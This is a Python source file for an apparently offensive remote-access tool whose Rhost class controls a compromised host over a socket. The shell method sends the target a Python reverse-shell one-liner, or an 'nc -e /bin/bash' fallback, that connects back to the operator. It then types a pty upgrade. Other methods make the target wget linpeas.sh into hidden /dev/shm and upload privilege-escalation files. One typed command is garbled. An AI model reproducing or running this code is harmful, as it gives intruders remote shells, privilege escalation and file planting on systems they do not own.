#!/usr/bin/env python3
import signal
import os
import random
import time
import socket
import subprocess
import readline
import sys
from pynput.keyboard import Key, Controller

class Rhost:

    def shell(conn):
        bufferSize = 2**12
        command = "which nc"
        conn.send(command.encode())
        recvNc = conn.recv(bufferSize).decode()
        port = random.randint(1000,20000)
        name = socket.gethostname()
        ip = socket.gethostbyname(name)
        try:
            subprocess.call(["terminator","-x","nc -lnvp %s"%(port)])
        except:
            print("You can't run 'shell module' as root :(")
        time.sleep(1)
        try:
            cmd = """python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""%(ip,port)
            conn.send(cmd.encode())
        except:
            cmd = "nc -e /bin/bash %s %s &"%(ip,port)
            conn.send(cmd.encode())
        keyboard = Controller()
        string = """python3 -c 'import pty;pty.spawn("/bin/bash")'"""
        for s in string:
            keyboard.press(s)
            keyboard.release(s)
        keyboard.press(Key.enter)
        keyboard.release(Key.enter)
        string = "export TER?=xter,"
        for s in string:
            keyboard.press(s)
            keyboard.release(s)
        keyboard.press(Key.enter)
        keyboard.release(Key.enter)


    def linpeas(conn):
        bufferSize = 2**12
        l = ["wget","nc"]
        for cmd in l:
            command = "which " + cmd
            conn.send(command.encode())
            recv = conn.recv(bufferSize).decode()
            if recv == '':
                print(f" {cmd} : NOT AVAILABLE")
            else:
                print(' %s: %s POTIENTIAL UPLOAD\n'%(cmd.replace("\n",""),recv.replace("\n","")))
                if "wget" in cmd:
                    bufferSize = 2**12
                    try:
                        os.chdir('/opt/peass/')
                        CMD = subprocess.Popen("python3 -m http.server", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        pid = CMD.pid + 1
                        time.sleep(2)
                        name = socket.gethostname()
                        ip = socket.gethostbyname(name)
                        command = "wget http://%s:8000/linpeas.sh -O /dev/shm/.linpeas.sh"%(ip)
                        conn.send(command.encode())
                        while True:
                            response = conn.recv(bufferSize).decode()
                            print(response)
                            if len(response) < bufferSize:
                                os.kill(pid, signal.SIGTERM)
                                break
                    except FileNotFoundError:
                        print("There is no linpeas in /opt/peass ! Please put it in this folder ('/opt/peass')")
                    except:
                        print("Error")
                    break
                elif "nc" in cmd:
                    print("not ready")
                    break





    def getDir(conn):
        bufferSize = 2**12
        getDir = "ls"
        conn.send(getDir.encode())
        listDir = conn.recv(bufferSize).decode()
        list = listDir.split('\n')

        def completer(text, state):
            options = [cmd for cmd in list if cmd.startswith(text)]
            if state < len(options):
                return options[state]
            else:
                return None

        readline.parse_and_bind("tab: complete")
        readline.set_completer(completer)

    def init(conn):
        bufferSize = 2**12
        conn.send(b'pwd')
        home = conn.recv(bufferSize).decode()
        conn.send(b'whoami')
        user = conn.recv(bufferSize).decode()
        if user != 'root':
            tag = "$"
        else:
            tag = "#"
        return home,user,tag

    def upload(conn,src,dest):
        bufferSize = 2**18
        src = "/opt/tamXX/privesc/"+src
        if os.path.isfile(src):
            size = os.path.getsize(src)
            c = "upload "+str(size)+" "+dest
            conn.send(c.encode())
            with open(src,"r") as f:
                content = f.read(1024)
                t = 1024
                print(size)
                while t < size:
                    t += 1024
                    content += f.read(1024)
                print(content)
                conn.send(content.encode())
                f.close()
            print(conn.recv(1024).decode())
        else:
            print('This file doesn\' exist')
